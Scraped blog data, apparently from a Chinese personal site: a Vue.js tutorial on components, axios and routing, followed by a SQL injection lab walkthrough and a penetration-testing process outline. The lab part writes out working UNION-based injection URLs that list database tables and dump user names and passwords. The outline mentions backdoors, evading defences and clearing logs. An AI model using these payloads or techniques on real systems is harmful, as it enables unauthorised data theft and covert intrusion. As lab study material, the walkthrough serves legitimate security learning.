将模版中的图片存在在img目录 将定义组件的js文件和vue的文件存放到js目录 vue组件封装的目录结构 11.2.3 组件的复用&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"css/my-components.css\" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;header-bar&gt;&lt;/header-bar&gt; &lt;/div&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/my-components.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\" }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 11.3 组件通信 vue实例本身就是一个组件（模板就是el指定容器 ,data就是组件数据,methods就是组件的事件函数）在vue实例指定的el容器中引用的组件称为子组件 ,当前vue实例就是父组件 11.3.1 父传子 vue实例引用组件的时候，传递数据到引用的组件中 示意图 11.3.2 子传父 通过子组件的按钮“调用”父组件的函数，通过函数传值 调用流程示意图 11.4 组件插槽 当我们自定义vue组件时，允许组件中的部分内容在调用组件时进行定义——插槽 11.4.1 插槽的使用 在自定义组件时通过slot标签在组件的模版中定义插槽 Vue.component(\"header-bar\",{ data:function(){ //组件中的data是通过函数返回的对象 return { str2:\"子组件中的数据\" }; }, template:`&lt;div class=\"divStyle\"&gt; &lt;table class=\"tableStyle\"&gt; &lt;tr&gt; &lt;td width=\"200\" align=\"right\" valign=\"middle\"&gt; &lt;img src=\"img/logo.png\" class=\"logoImg\"&gt; &lt;/td&gt; &lt;td&gt; &lt;label class=\"titleStyle\"&gt; {{title}} &lt;/label&gt; &lt;/td&gt; &lt;td&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/td&gt; &lt;td&gt; &lt;button @click=\"childMethod\"&gt;子组件中的按钮&lt;/button&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt;`, props:[\"title\"], methods:{ childMethod:function(){ this.$emit(\"my-event\",this.str2); } } }); 在父组件中调用此组件时，指定插槽填充的模版 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"css/bootstrap.css\" /&gt; &lt;link rel=\"stylesheet\" href=\"css/my-components.css\" /&gt; &lt;script type=\"text/javascript\" src=\"js/jquery-3.4.1.min.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/bootstrap.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;header-bar :title=\"sss\"&gt; &lt;!--组件标签包含的HTML默认为填充到插槽的模版--&gt; &lt;input/&gt;&lt;button&gt;搜索&lt;/button&gt; &lt;/header-bar&gt; &lt;/div&gt; &lt;script type=\"text/javascript\" src=\"js/my-components.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ sss:\"自定义标题\" } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 11.4.2 具名插槽 当组件中的插槽数量&gt;1时，需要给组件中的slot标签添加name属性指定插槽的名字 定义组件： Vue.component(\"page-frame\",{ template:`&lt;div&gt; &lt;div id=\"header\" style=\"width:100%; height:100px;background:pink\"&gt; &lt;slot name=\"s1\"&gt;&lt;/slot&gt; &lt;/div&gt; &lt;div style=\"width:100%; height:580px\"&gt; &lt;slot name=\"s2\"&gt;&lt;/slot&gt; &lt;/div&gt; &lt;div id=\"footer\" style=\"width:100%; height:40px;background:lightgray\"&gt;{{cr}}&lt;/div&gt; &lt;/div&gt;`, props:[\"title\",\"cr\"] }); 引用组件 template &lt;div id=\"container\"&gt; &lt;page-frame title=\"标题\" cr=\"千锋武汉\"&gt; &lt;!--定义一个模版，填充到组件的name=s1的 插槽--&gt; &lt;template slot=\"s1\"&gt; &lt;input type=\"text\" placeholder=\"歌曲名、歌手\" /&gt; &lt;button type=\"button\" @click=\"doSearch\"&gt;搜索&lt;/button&gt; &lt;/template&gt; &lt;!--定义一个模版，填充到组件的name=s2的 插槽--&gt; &lt;template slot=\"s2\"&gt; &lt;table class=\"table table-bordered table-condensed\"&gt; &lt;tr&gt; &lt;th&gt;序号&lt;/th&gt; &lt;th&gt;歌曲ID&lt;/th&gt; &lt;th&gt;歌曲名&lt;/th&gt; &lt;th&gt;歌手&lt;/th&gt; &lt;th&gt;专辑&lt;/th&gt; &lt;th&gt;时长&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/template&gt; &lt;/page-frame&gt; &lt;/div&gt; 11.4.3 插槽作用域 定义组件时，将组件中的数据绑定到slot标签 Vue.component(\"page-frame\",{ template:`&lt;div&gt; &lt;div id=\"header\" style=\"width:100%; height:100px;background:pink\"&gt; &lt;slot name=\"s1\"&gt;&lt;/slot&gt; &lt;/div&gt; &lt;div style=\"width:100%; height:580px\"&gt; &lt;slot name=\"s2\" v-bind:musics=\"songs\"&gt;&lt;/slot&gt; &lt;/div&gt; &lt;div id=\"footer\" style=\"width:100%; height:40px;background:lightgray\"&gt;{{cr}}&lt;/div&gt; &lt;/div&gt;`, props:[\"title\",\"cr\"], data:function(){ return { songs:[ {},{} ] }; } }); 引用组件时，在填充插槽的模版上使用slot-scopt属性获取插槽绑定的值 &lt;page-frame title=\"标题\" cr=\"千锋武汉\"&gt; &lt;template slot=\"s1\"&gt; &lt;input type=\"text\" placeholder=\"歌曲名、歌手\" /&gt; &lt;button type=\"button\" @click=\"doSearch\"&gt;搜索&lt;/button&gt; &lt;/template&gt; &lt;!--在使用模版填充组件插槽时，可以使用slot-scope属性获取组件插槽绑定的数据的集合 --&gt; &lt;template slot=\"s2\" slot-scope=\"res\"&gt; &lt;table class=\"table table-bordered table-condensed\"&gt; &lt;tr&gt; &lt;th&gt;序号&lt;/th&gt; &lt;th&gt;歌曲ID&lt;/th&gt; &lt;th&gt;歌曲名&lt;/th&gt; &lt;th&gt;歌手&lt;/th&gt; &lt;th&gt;专辑&lt;/th&gt; &lt;th&gt;时长&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;tr v-for=\"song,index in res.musics\"&gt; &lt;td&gt;{{index+1}}&lt;/td&gt; &lt;td&gt;{{song.id}}&lt;/td&gt; &lt;td&gt; {{song.name}} &lt;/td&gt; &lt;td&gt; &lt;span v-for=\"artist in song.artists\"&gt; &amp;nbsp;{{artist.name}} &lt;/span&gt; &lt;/td&gt; &lt;td&gt;{{song.album.name}}&lt;/td&gt; &lt;td width=\"8%\"&gt; {{ Math.floor( Math.round(song.duration/1000)/60) &lt; 10 ? '0'+Math.floor( Math.round(song.duration/1000)/60) : Math.floor( Math.round(song.duration/1000)/60) }} : {{ Math.round(song.duration/1000)%60 &lt;10 ? '0'+( Math.round(song.duration/1000)%60 ) : Math.round(song.duration/1000)%60 }} &lt;/td&gt; &lt;td width=\"10%\"&gt; &lt;button type=\"button\" class=\"btn btn-primary btn-xs\"&gt;播放&lt;/button&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/template&gt; &lt;/page-frame&gt; 十二、axios12.1 axios介绍 vue可以实现数据的渲染，但是如何获取数据呢？ vue本身不具备通信能力，通常结合axios—一个专注于异步通信的js框架来使用 axios 数据通信 vue 数据渲染 12.2 axios入门使用 原生ajax — 实现步骤复杂 jQuery 笨重 axios 简洁、高效，对RESTful支持良好 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/axios.min.js\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;button type=\"button\" @click=\"test1\"&gt;测试1&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", methods:{ test1:function(){ //发送异步请求 // axios.get(url).then(fn); // axios.get(url,{}).then(fn) axios.get(\"http://localhost:9999/music/detail\",{ params:{ id:\"25640392\" } }) .then(function(res){ console.log(res); }); } } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 12.3 axios异步请求方法 axios提供了多种异步请求方法，实现对RESTful风格的支持 12.3.1 get请求 axios.get(url).then(fn); axios.get(url,{}).then(fn) //使用axios的get请求传递参数，需要将参数设置在params下 axios.get(\"http://localhost:9999/music/detail\",{ params:{ id:\"25640392\" } }) .then(function(res){ console.log(res); }); 12.3.2 post请求 axios.post(url,{}).then(fn) axios.post(\"http://localhost:9999/music/search\",{s:\"阿刁\"}) .then(function(res){ console.log(res); }); 12.3.3 自定义请求 自定义请求：自定义请求方式、请求参数、请求头、请求体（post） axios({ url:\"http://localhost:9999/music/search\", method:\"post\", params:{ //设置请求行传值 s:\"成都\", limit:15 }, headers:{ //设置请求头 }, data:{ //设置请求体（post/put） } }).then(function(res){ console.log(res) }); 12.3.4 其他 delete put option 12.4 并发请求&lt;div id=\"container\"&gt; &lt;button type=\"button\" @click=\"test1\"&gt;测试1&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", methods:{ test1:function(){ //发送异步请求 axios.all([listMusics(),getMusicDetail()]).then(axios.spread(function (r1, r2) { // 两个请求现在都执行完成 console.log(r1); console.log(r2); })); } } }); function listMusics() { return axios.get('http://localhost:9999/music/search?s=成都'); } function getMusicDetail() { return axios.get('http://localhost:9999/music/detail?id=25640392'); } &lt;/script&gt; 12.5 箭头函数12.5.1 axios回调函数的参数res res并不是接口返回的数据，而是表示一个响应对象；res.data才表示接口响应的数据 12.5.2 箭头函数&lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ song:{ } }, methods:{ test1:function(){ //发送异步请求 axios.get(\"http://localhost:9999/music/detail?id=25640392\").then( (res)=&gt;{ // res并不是接口返回的数据，而是表示一个响应对象；res.data才表示接口响应的数据 if(res.data.code == 200){ this.song = res.data.songs[0]; } }); } } }); &lt;/script&gt; 十三、路由 router router是由vue官方提供的用于实现组件跳转的插件 13.1 路由插件的引用13.3.1 离线&lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/vue-router.js\"&gt;&lt;/script&gt; 13.3.2 在线CDN&lt;script src=\"https://unpkg.com/vue/dist/vue.js\"&gt;&lt;/script&gt; &lt;script src=\"https://unpkg.com/vue-router/dist/vue-router.js\"&gt;&lt;/script&gt; 13.2 路由使用案例&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=\"text/css\"&gt; body{padding: 0px;margin: 0px;} ul{list-style: none;} ul li{display: inline; float: left; margin-left: 15px; margin-bottom: 15px;} ul li a{text-decoration: none; color: white; font-size: 18px; font-weight: bold;} ul li a:hover{color: yellow;} &lt;/style&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/vue-router.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;div style=\"width: 100%; height: 70px; background: #00BFFF;\"&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;img src=\"img/logo.png\" height=\"70\" style=\"margin-left:100px;\"/&gt;&lt;/td&gt; &lt;td&gt; &lt;ul&gt; &lt;li&gt;&lt;router-link to=\"/a\"&gt;首页&lt;/router-link&gt;&lt;/li&gt; &lt;li&gt;&lt;router-link to=\"/b\"&gt;Java&lt;/router-link&gt;&lt;/li&gt; &lt;li&gt;&lt;router-link to=\"/c\"&gt;HTML5&lt;/router-link&gt;&lt;/li&gt; &lt;li&gt;&lt;router-link to=\"/d\"&gt;Python&lt;/router-link&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt; &lt;div style=\"width: 100%; height: 680px; background: lemonchiffon;\"&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; // vue的路由旨在为单页面应用开发提供便捷 //1.定义链接跳转的模板（组件） const t1 = {template:`&lt;p&gt;index&lt;/p&gt;`}; const t2 = {template:`&lt;p&gt;Java&lt;/p&gt;`}; const t3 = {template:`&lt;p&gt;HTML5&lt;/p&gt;`}; const t4 = {template:`&lt;p&gt;PYTHON&lt;/p&gt;`}; const myrouter = new VueRouter({ routes:[ {path:\"/a\",component:t1}, {path:\"/b\",component:t2}, {path:\"/c\",component:t3}, {path:\"/d\",component:t4} ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 13.3 动态路由匹配13.3.1 通配符 *可以匹配任意路径 例如： /user-* 匹配所有以user-开头的任意路径 /* 匹配所有路径 const myrouter = new VueRouter({ routes:[ {path:\"/user-*\",component:...}, {path:\"/*\",component:...} ] }); 注意如果使用通配符定义路径，需要注意路由声明的顺序 13.3.2 路由参数 /a/:id 可以匹配 /a/开头的路径 &lt;div id=\"container\"&gt; &lt;li&gt;&lt;router-link to=\"/a/101\"&gt;首页&lt;/router-link&gt;&lt;/li&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = {template:`&lt;p&gt;index:{{$route.params.id}}&lt;/p&gt;`}; const myrouter = new VueRouter({ routes:[ {path:\"/a/:id\",component:t1} ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; 13.3.3 优先级如果一个路径匹配了多个路由，则按照路由的配置顺序：路由定义的越早优先级就越高。 13.4 嵌套路由 在一级路由的组件中显示二级路由 &lt;div id=\"container\"&gt; &lt;router-link to=\"/a\"&gt;首页&lt;/router-link&gt; &lt;router-link to=\"/a/c1\"&gt;首页-c1&lt;/router-link&gt; &lt;router-link to=\"/a/c2\"&gt;首页-c2&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { template:\"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;index&lt;hr/&gt;&lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;\" }; const t2 = {template:`&lt;div&gt;t2&lt;/div&gt;`}; const t3 = {template:`&lt;div&gt;t3&lt;/div&gt;`}; const myrouter = new VueRouter({ routes:[ { path:\"/a\", component:t1, children:[ { path:\"c1\", component:t2 }, { path:\"c2\", component:t3 } ] } ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; 13.5 编程式导航13.5.1 push()&lt;div id=\"container\"&gt; &lt;button type=\"button\" @click=\"test\"&gt;按钮&lt;/button&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { template:\"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;index&lt;/div&gt;\" }; const myrouter = new VueRouter({ routes:[ { path:\"/a\", component:t1 } ] }); var vm = new Vue({ el:\"#container\", router:myrouter, methods:{ test:function(){ //js代码实现路由跳转：编程式导航 myrouter.push(\"/a\"); } } }); &lt;/script&gt; 13.5.2 push()参数//1.字符串 myrouter.push(\"/a\"); //2.对象 myrouter.push({path:\"/a\"}); //3.命名的路由 name参数指的是定义路由时指定的名字 myrouter.push({name:\"r1\",params:{id:101}}); //4.URL传值，相当于/a?id=101 myrouter.push({path:\"/a\",query:{id:101}}); 13.5.3 replace() 功能与push一致，区别在于replace()不会向history添加新的浏览记录 13.5.4 go() 参数为一个整数，表示在浏览器历史记录中前后/后退多少步 相当于window.history.go(-1)的作用 13.6 命名路由 命名路由：在定义路由的时候可以给路由指定name，我们在进行路由导航时可以通过路由的名字导航 &lt;div id=\"container\"&gt; &lt;input type=\"text\" v-model=\"rname\"/&gt; &lt;router-link :to=\"{name:rname}\"&gt;t1&lt;/router-link&gt; &lt;button type=\"button\" @click=\"test\"&gt;按钮1&lt;/button&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { template:\"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;t1&lt;/div&gt;\" }; const t2 = { template:\"&lt;div style='width:400px; height:200px; border:red 1px solid'&gt;t2&lt;/div&gt;\" }; const myrouter = new VueRouter({ routes:[ { path:\"/a\", name:\"r1\", component:t1 }, { path:\"/b\", name:\"r2\", component:t2 } ] }); var vm = new Vue({ el:\"#container\", data:{ rname:\"r1\" }, router:myrouter, methods:{ test:function(){ myrouter.push({name:vm.rname}); } } }); &lt;/script&gt; 13.7 命名路由视图&lt;div id=\"container\"&gt; &lt;router-link to=\"/a\"&gt;t1&lt;/router-link&gt; &lt;router-link to=\"/b\"&gt;t2&lt;/router-link&gt; &lt;!--路由视图--&gt; &lt;!--如果在HTML中有一个以上的路由视图router-view，需要给router-view指定name，在路由中使用components映射多个组件根据name设置组件与router-view绑定关系--&gt; &lt;router-view name=\"v1\"&gt;&lt;/router-view&gt; &lt;router-view name=\"v2\"&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t11 = { template:\"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;t11&lt;/div&gt;\" }; const t12 = { template:\"&lt;div style='width:400px; height:200px; background:pink'&gt;t12&lt;/div&gt;\" }; const t21 = { template:\"&lt;div style='width:400px; height:200px; border:red 1px solid'&gt;t21&lt;/div&gt;\" }; const t22 = { template:\"&lt;div style='width:400px; height:200px; background:yellow'&gt;t22&lt;/div&gt;\" }; const myrouter = new VueRouter({ routes:[ { path:\"/a\", components:{ v1:t11, v2:t12 } }, { path:\"/b\", components:{ v1:t21, v2:t22 } } ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; 13.8 重定向和别名13.8.1 重定向访问/b，重定向到/a &lt;div id=\"container\"&gt; &lt;router-link to=\"/a\"&gt;路径A&lt;/router-link&gt; &lt;router-link to=\"/b\"&gt;路径B&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { template:\"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;index&lt;/div&gt;\" }; const myrouter = new VueRouter({ routes:[ { path:\"/a\", component:t1 }, { path:\"/b\", redirect:\"/a\" } ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; 根据路由命名重定向 const myrouter = new VueRouter({ routes:[ { path:\"/a\", name:\"r1\", component:t1 }, { path:\"/b\", //redirect:\"/a\" //根据路由路径重定向 redirect:{name:\"r1\"} //根据路由命名重定向 } ] }); 13.8.2 路由别名&lt;div id=\"container\"&gt; &lt;router-link to=\"/a\"&gt;路径A&lt;/router-link&gt; &lt;router-link to=\"/wahaha\"&gt;路径wahaha（别名）&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { template:\"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;index&lt;/div&gt;\" }; const myrouter = new VueRouter({ routes:[ { path:\"/a\", alias:\"/wahaha\", component:t1 } ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; 13.9 路由组件传参可以通过/url/:attr方式实现通过路由传值给组件 &lt;div id=\"container\"&gt; &lt;router-link to=\"/a/101\"&gt;路径A&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { template:`&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt; index：{{$route.params.id}} &lt;/div&gt;` }; const myrouter = new VueRouter({ routes:[ { path:\"/a/:id\", component:t1 } ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; 通过props传参 &lt;div id=\"container\"&gt; &lt;router-link to=\"/a/102\"&gt;路径A&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { props:[\"id\"], template:`&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt; index：{{id}} &lt;/div&gt;` }; const myrouter = new VueRouter({ routes:[ { path:\"/a/:id\", props:true, component:t1 } ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt;","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"简要sql注入","slug":"p12简要sql注入","date":"2021-03-30T14:11:12.000Z","updated":"2021-12-03T17:43:39.757Z","comments":true,"path":"posts/20.html","link":"","permalink":"https://bigbug888.github.io/posts/20.html","excerpt":"","text":"简要sql注入​ 危害：1. 危害数据库里面的数据，导致数据可以被增删查改 ​ 2. 危害网站权限 sql注入条件： 可控变量，带入数据库查询，变量未存在过滤或者过滤不严谨，其中前两者缺一不可 通过inurl:php?page查询带有page的网站，选个id=…的页面，别写在page后面，page可以写到id前也可以写到id后，page写后面方便使用工具 图中操作系统，主要有windows，linux，其中linux区分大小写 数据注入的低版本和高版本是5.0为界限 其中文件读写，就是要用到网站路径等等 数据库 表名 列名 数据 show database; user tablename; show tables; select * from biao; select password from biao exit 判断注入点： 老方法： and 1=1 页面正常 ​ and 1=2 页面错误 新方法： id=1chigualalala ​ 就是在数字后面随便乱输入，若有显示报错，说明数据有被接受处理，然后带入到了数据库中查询，则有注入，没反应就没有，当然有特例：如果显示404错误，或者跳转到第三方界面，说明网站对输入有检测，从而没有漏洞 实操：点击公告才有显示参数 判断注入： 猜猜列名数量（有多少个字段数等等），用order by 去试试：1，2，3，4，5 http://219.153.49.228:49241/new_list.php?id=1%20order%20by%204 可访问 http://219.153.49.228:49241/new_list.php?id=1%20order%20by%205 报错，页面开始显示不正常了 从而判断，4列 order by : select * from 表名 order by 列名(或者数字) asc；升序(默认升序) select * from 表名 order by 列名(或者数字) desc；降序 尝试union 1，2，3，4联合查询，结果发现2，3位置出现异常可以注入 http://219.153.49.228:49241/new_list.php?id=1 union select 1,2,3,4 http://219.153.49.228:49241/new_list.php?id=-1 union select 1,2,3,4 3.信息收集：收集数据库版本（version()），数据库名字(database())，数据库用户名(user)，操作系统(@@version_compile_os)等等,利用这些在2，3注入 http://219.153.49.228:49241/new_list.php?id=-1%20union%20select%201,version(),database(),4 http://219.153.49.228:49241/new_list.php?id=-1%20union%20select%201,user(),@@version_compile_os,4 注意: 1. mysql5.0以上版本的mysql数据库中,存在一个自带数据库名为information_schema,它里面有所有的数据库名,列 2.数据库中符号\" . \" 表示下一级,如:bigbug.user表示bigbug数据库下面的user表 information_schema.tables:记录所有的表名的信息的表 information_columns.tables:记录所有的列名的信息的表 table_name:表名 column_name:列名 table_schema:数据库名 由于判断了版本是5.7,所以根据information_schema,table_schema,table_name http://219.153.49.228:49241/new_list.php?id=-1%20union%20select%201,table_name,@@version_compile_os,4%20from%20information_schema.tables%20where%20table_schema=%20%27mozhe_Discuz_StormGroup%27 然后是查表名,查询指定的表名,stormgroup_member下面的列, http://219.153.49.228:49241/new_list.php?id=-1%20union%20select%201,group_concat(column_name),@@version_compile_os,4%20from%20information_schema.columns%20where%20table_schema=%20%27mozhe_Discuz_StormGroup%27 http://219.153.49.228:49241/new_list.php?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='StormGroup_member' ![image-20211204013313652](https://gitee.com/tianfu6/img/raw/master/typoraimg/202112040133897.png) 查询指定的数据 select 1,group(name),group(password),4 from StormGroup_member select 1,group(status),group(password),4 from StormGroup_member http://219.153.49.228:49241/new_list.php?id=-1%20union%20select%201,group_concat(name,status),group_concat(password),4%20from%20StormGroup_member group_concat(name,password,status)可以显示多个, limit可以用来猜多个数据","categories":[{"name":"网安","slug":"网安","permalink":"https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"web","slug":"web","permalink":"https://bigbug888.github.io/tags/web/"},{"name":"渗透","slug":"渗透","permalink":"https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"网安奥利给","slug":"网安奥利给","date":"2021-01-29T18:01:12.000Z","updated":"2021-12-12T12:42:51.812Z","comments":true,"path":"posts/20.html","link":"","permalink":"https://bigbug888.github.io/posts/20.html","excerpt":"","text":"HTTP协议理论http协议状态码1xx-提供信息 2xx-请求成功提交 3xx-客户端被重定向到其他资源 4xx-请求包含某种错误 5xx-服务器执行请求时遇到错误 100 Continue当客户端提交一个包含主体的请求时.将发送这个响应。该响应表示已 收到请求消息头.客户端应继续发送主体。请求完成后，再由服务器返回另一个响应。 200 OK本状态码表示已成功提交请求，且响应主体中包含请求结果。 201 Created. PUT请求的响应返回这个状态码，表示请求已成功提交。 301 Moved Permanently本状态码将浏览器永久重定向到另外一个在Location消息 头中指定 的URL。以后客户端应使用新URL替换原始URL。 302 Found本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL. 客户端 应在随后的请求中恢复使用原始URL. 304 Not Modified本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务 器使用 If-Modified-Since与工f-None-Match消息头确定客户端是否拥有最新版本的 资源 400 Bad Request本状态码表示客户端提交了一个无效的HTTP请求。当以某种无效 的方式修 改请求时（例如在URL中插人一个空格符）,可能会遇到这个状态码。 401 Unauthorized.服务器在许可请求前要求HTTP进行身份验证。WWW- Authenticate消息头详 细说明所支持的身份验证类型。 403 Forbidden本状态码指出，不管是否通过身份验证，禁止任何人访问被请求的资 源。 404 Not Found本状态码表示所请求的资源并不存在。 405 Method Not Allowed本状态码表示指定的URL不支持请求中使用的方法。例如， 如果试 图在不支持PUT方法的地方使用该方法，就会收到本状态码。 413 Request Entity Too Large 则本状态码表示请求主体过长，服务器无法处理 414 Request URI Too Longo与前一个响应类似，本状态码表示请求中的URL过长， 服务器无法处理。 500 Internal Server Erroro本状态码表示服务器在执行请求时遇到错误。当提交无法 预料的 输人、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。 应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。 503 Service Unavailableo通常，本状态码表示尽管Web服务器运转正常.并且能够响 应请求,但服务器访问的应用程序还是无法作出响应。应该进行核实，是否因为执行了 某种行为而造成这个结果 渗透测试流程一般的渗透测试流程 明确目标 确定范围：测试目标的范围、ip、域名、内外网、测试账户。 l 确定规则：能渗透到什么程度，所需要的时间、能否修改上传、能否提权、等等。 l 确定需求：web应用的漏洞、业务逻辑漏洞、人员权限管理漏洞等等 信息收集在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息， 比如：脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、 数据库类型、所有链接页面，用到的框架等。 l 方式：主动扫描，开放搜索等。 l 开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。 l 基础信息：IP、网段、域名、端口。 l 应用信息：各端口的应用。例如web应用、邮件应用、等等。 l 系统信息：操作系统版本 l 版本信息：所有这些探测到的东西的版本。 l 服务信息：中间件的各类信息，插件信息。 l 人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。 l 防护信息：试着看能否探测到防护设备 漏洞探测利用上一步中列出的各种系统，应用等使用相应的漏洞。 方法： (1) 漏扫，awvs，IBM appscan等。 (2) 结合漏洞去exploit-db等位置找利用。 (3) 在网上寻找验证poc。 内容： l 系统漏洞：系统没有及时打补丁 l WebSever漏洞：WebSever配置问题 l Web应用漏洞：Web应用开发问题 l 其它端口服务漏洞：各种21/8080(st2)/7001/22/3389 l 通信安全：明文传输，token在cookie中传送等 漏洞验证将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭 建模拟环境进行试验。成功后再应用于目标中。 l 自动化验证：结合自动化扫描工具提供的结果 l 手工验证 : 根据公开资源进行验证 l 试验验证：自己搭建模拟环境进行验证 l 登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息 l 业务漏洞验证：如发现业务漏洞，要进行验证 公开资源的利用 l exploit-db/wooyun/ l google hacking l 渗透代码网站 l 通用、缺省口令 l 厂商的漏洞警告等等 信息分析为下一步实施渗透做准备。 l 精准攻击：准备好上一步探测到的漏洞的exp，用来精准打击 l 绕过防御机制：是否有防火墙等设备，如何绕过 l 定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标 l 绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等 （免杀） l 攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等 利用漏洞获取数据实施攻击：根据前几步的结果，进行攻击 获取内部信息：基础设施（网络连接，vpn，路由，拓扑等） 进一步渗透：内网入侵，敏感目标 持续性存在：一般对客户做渗透不需要。rookit，后门，添加管理账号，驻扎 手法等 清理痕迹：清理相关日志（访问，操作），上传文件等 信息整理目的：为了最后形成报告，形成测试结果使用。 整理渗透工具：整理渗透过程中用到的代码，poc，exp等 整理收集信息：整理渗透过程中收集到的一切信息 整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息 写报告 信息收集 1.端口收集 文件上传漏洞1. 